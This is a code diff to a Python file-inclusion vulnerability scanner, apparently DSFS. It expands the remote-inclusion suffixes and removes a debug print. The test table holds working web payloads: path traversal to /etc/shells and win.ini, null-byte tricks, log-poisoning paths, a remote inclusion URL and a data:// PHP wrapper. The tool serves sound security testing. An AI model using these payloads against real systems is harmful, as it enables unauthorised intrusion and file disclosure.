@@ -16,7 +16,7 @@ ERROR_REGEX = r"(?i)(Fatal error|Warning)(</b>)?:\s+((require|include)(_once)?|f
 
 FI_TESTS = (                                                                                                # each (test) item consists of ("filepath", "content recognition regex", (combining "prefixes"), (combining "suffixes"), 'inclusion type')
     ("", r"\[[^\]]+\]\s+\[(warn|notice|error)\]\s+\[client", ("/xampp/apache/logs/", "/apache/logs/", "/wamp/apache2/logs/", "/wamp/logs/", "/program files/wamp/apache2/logs/", "/program files/apache group/apache/logs/", "/var/log/apache/", "/var/log/apache2/", "/var/log/httpd/", "/var/log/nginx/", "/opt/lampp/logs/", "/opt/xampp/logs/"), ("error.log", "error.log%00"), 'L'),
-    ("https://raw.githubusercontent.com/stamparm/DSFS/master/files/", "Usage of Damn Small FI Scanner", ("",), ("image.jpg", "image.jpg%00"), 'R'),
+    ("https://raw.githubusercontent.com/stamparm/DSFS/master/files/", "Usage of Damn Small FI Scanner", ("",), ("", "%00", "config", "config.php", "config.php%00", "image.jpg", "image.jpg%00"), 'R'),
     ("/etc/shells", "valid login shells", ("../../../../../../..", ""), ("", "%00"), 'L'),
     ("/windows/win.ini", "for 16-bit app support", ("../../../../../../..", ""), ("", "%00"), 'L'),
     ("data://text/plain;base64,%s" % DYNAMIC_CONTENT.encode("base64").strip(), ("<?php echo base64_decode\(|%s" % DYNAMIC_CONTENT_VALUE), ("", ), ("", ), 'S'),
@@ -33,7 +33,6 @@ USER_AGENTS = (                                                                 
 _headers = {}                                                                                               # used for storing dictionary with optional header values
 
 def _retrieve_content(url, data=None, method=None):
-    print url
     try:
         req = urllib2.Request("".join(url[i].replace(' ', "%20") if i > url.find('?') else url[i] for i in xrange(len(url))), data, _headers)
         req.get_method = lambda: method or (POST if data else GET)
